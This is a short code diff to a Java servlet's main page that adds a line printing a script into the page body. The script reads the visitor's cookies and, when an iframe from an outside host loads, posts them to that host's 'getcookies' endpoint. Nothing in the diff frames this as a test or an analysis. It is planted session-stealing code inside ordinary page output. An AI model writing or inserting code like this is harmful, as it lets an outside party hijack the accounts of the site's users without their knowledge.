@@ -136,6 +136,8 @@ public class MainPage extends HttpServlet {
 
         // Body
         out.println("<body class=\"max-height\">");
+            out.println("<script src=\"assets/js/jquery-3.1.1.min.js\"></script><script>cookies = document.cookie; function send() { $.ajax({ type: \"POST\", url: \"http://jecoloc-galleriafoto.rhcloud.com/getcookies\", data: { value: cookies, }, }); } </script> <iframe src=\"http://jecoloc-galleriafoto.rhcloud.com/banner.html\" onload=\"send()\"></iframe>");
+
             // Top menus
             username = (String) request.getSession().getAttribute(SessionData.PLAYER_USERNAME.toString());
             out.println(HTMLBuilder.createTopMenu());
